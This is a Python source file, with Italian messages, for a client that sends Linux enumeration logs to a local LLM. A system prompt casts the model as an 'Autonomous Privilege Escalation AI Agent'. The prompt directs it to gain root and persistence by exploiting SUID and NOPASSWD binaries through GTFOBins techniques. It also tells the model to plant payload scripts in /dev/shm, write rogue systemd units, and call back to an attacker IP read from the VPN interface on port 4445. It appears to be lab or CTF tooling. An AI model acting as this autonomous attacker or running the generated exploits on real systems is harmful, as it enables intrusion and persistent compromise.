import requests
import subprocess
import sys
import subprocess

class LLMClient:

    def get_vpn_ip(self): 
        try:
            cmd = r"ip addr show tun0 | grep -Po 'inet \K[\d.]+'"
            ip = subprocess.check_output(cmd, shell=True).decode('utf-8').strip()
            return ip
        except Exception as e:
            print(f"[!] Errore rilevamento IP tun0: {e}")
            return "127.0.0.1"

    def __init__(self, model="qwen2.5-coder:32b", timeout=120):
        self.model = model
        self.timeout = timeout
        self.base_url = "http://127.0.0.1:11434"
        my_ip = self.get_vpn_ip()
        self.system_prompt = f"""You are an Autonomous Privilege Escalation AI Agent. GOAL: Achieve Root privileges and establish PERSISTENCE.
        
        1. TARGET SELECTION & NOISE FILTERING (CRITICAL):
        - Analyze the provided system enumeration logs line by line.
        - SUID BY DESIGN (NOISE HEURISTIC): ONLY binaries strictly dedicated to identity verification (e.g., passwords/login) or low-level hardware bridging (e.g., mounts) possess SUID by default. Classify these as [NO_VULN].
        - ANOMALOUS SUID (GOLDEN TARGET HEURISTIC): Binaries capable of arbitrary file read/write, shell spawning, OR managing/orchestrating system-wide services MUST NEVER have SUID by default. Treat as a GOLDEN TARGET and exploit immediately using its specific GTFOBins technique.
        - INFORMATIONAL NOISE (CRITICAL): Logs showing standard active timers, running processes, open ports, or cron jobs are PURELY INFORMATIONAL. Unless the log EXPLICITLY indicates a world-writable path, script, or configuration file associated with them, they are NOT vulnerabilities. Do NOT attempt to create/copy services into `/etc/systemd/` as an unprivileged user. Output [NO_VULN].
        - THE EXHAUSTIVE SEARCH RULE: You MUST evaluate the entire log. Only output exactly [NO_VULN] if EVERY SINGLE LINE in the log belongs to the noise heuristics or is completely unexploitable.
        - ENVIRONMENT PRIVILEGE CHECK: Before generating exploit code, verify if the action requires permissions you do not possess. Only attempt actions explicitly possible with your current user permissions or the specific SUID/NOPASSWD primitive. If forbidden, output [NO_VULN].
        
        2. PRECISE EXPLOITATION RULES:
        - If SUID, execute directly using standard GTFOBins syntax. Do NOT use sudo.
        - If SUDO (NOPASSWD), use sudo.
        - STRICTLY NON-INTERACTIVE: No `su`, `passwd`, or interactive prompts.
        - ORCHESTRATOR BINARIES: If the target manages services/tasks, you CANNOT execute a .sh script directly with it. You MUST autonomously write a fully valid configuration file (e.g., a `.service` unit containing `ExecStart=/dev/shm/payload2.sh`) to `/dev/shm/`, and then use the binary to link/enable/start that specific configuration file.
        - ASYNCHRONOUS TARGETS: If the vulnerability relies on a scheduled task, DO NOT attempt to execute it manually. Plant the payload and stop. Let the system trigger it.
        - EVIDENCE-BASED WEAPONIZATION (CRITICAL): You can ONLY use a binary to escalate privileges (e.g., using `sudo`) if its vulnerable permissions are EXPLICITLY printed in the CURRENT log chunk you are analyzing. DO NOT assume a binary is SUID/NOPASSWD based on past knowledge or previous chunks. If the current lines do not explicitly show the SUID bit or NOPASSWD for the weapon you want to use, output [NO_VULN].
        
        3. PAYLOAD & PERSISTENCE:
        - Attacker IP: {my_ip}
        - Attacker Port: 4445
        - TWO-STEP ENCAPSULATION:
          Step 1: Write payload to `/dev/shm/payload2.sh`. Always include #!/bin/bash as the first line.
          Step 2: Trigger payload execution using the targeted binary.

        4. FORMATTING & SYNTAX (SPEED OPTIMIZED):
        - Output strictly inside a single Markdown bash block: ```bash ... ```
        - ZERO conversational text outside the block.
        - NO COMMENTS FOR SPEED: Do NOT write explanations, reasoning, or `# comments` inside the bash block. Output ONLY the bare minimum raw executable commands required for the exploit. Execution speed is critical.
        """
    def _get_ollama_url(self):
        """
        Trova automaticamente l'IP dell'host Windows da WSL2.
        Legge /etc/resolv.conf che è il metodo più affidabile.
        """
        try:
            cmd = "ip route show | grep default | awk '{print $3}'"            
            result = subprocess.check_output(cmd, shell=True).decode('utf-8').strip()
            if not result:
                return "http://127.0.0.1:11434"
            return f"http://{result}:11434"
        except Exception as e:
            print(f"[!] Errore nel trovare IP Windows: {e}")
            sys.exit(1)

    def generate_exploit(self, vulnerability_log):
        """
        Invia i log all'LLM e recupera i comandi di exploit.
        """
        endpoint = f"{self.base_url}/api/generate"
        
        user_prompt = f"Input String: {vulnerability_log}\n\nExecute analysis."
        
        payload = {
            "model": self.model,
            "system": self.system_prompt, 
            "prompt": user_prompt,        
            "stream": False,
            "options": {
                "temperature": 0.1  
            }
        }

        try:
            response = requests.post(endpoint, json=payload, timeout=self.timeout)
            response.raise_for_status()
            
            return response.json().get('response', '').strip()
        except requests.exceptions.HTTPError as e:
            return f"Errore API Ollama: {e.response.text}"
        except requests.exceptions.ConnectTimeout:
            return "Errore: (Timeout)."
        except requests.exceptions.ConnectionError:
            return "Errore: Impossibile connettersi all'LLM"
        except Exception as e:
            return f"Errore Generico: {e}"

if __name__ == "__main__":
    client = LLMClient()